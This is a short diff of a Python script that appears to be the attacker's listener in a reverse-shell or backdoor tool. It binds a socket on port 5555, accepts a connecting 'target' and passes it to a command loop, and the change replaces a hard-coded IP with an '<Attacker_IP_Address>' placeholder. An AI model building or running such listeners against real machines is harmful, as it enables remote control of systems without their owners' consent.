@@ -54,12 +54,13 @@ def reliableRecieve():
             continue
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.bind(('10.168.130.37', 5555))
+s.bind(('<Attacker_IP_Address>', 5555))
 
 print('[+] Listening for incoming connections...')
 s.listen(5) # The program will listen upto 5 connections
 
 target, ip = s.accept() # Accepting the incoming connections and storing the target socket object with the IP address
 print('[+] Target connected from IP: ' + str(ip))
+
 
 targetCommunication()
